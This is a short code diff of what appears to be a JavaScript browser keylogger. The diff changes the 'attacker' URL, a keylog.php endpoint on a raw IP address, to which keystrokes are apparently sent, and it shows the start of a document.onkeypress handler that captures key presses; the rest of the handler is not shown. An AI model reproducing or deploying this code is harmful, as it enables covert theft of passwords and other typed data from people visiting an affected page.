@@ -1,5 +1,5 @@
 var buffer = [];
-var attacker = 'http://91.142.94.69/keylog.php?c='
+var attacker = 'http://91.142.94.76/keylog.php?c='
 
 document.onkeypress = function(e) {
     var timestamp = Date.now() | 0;
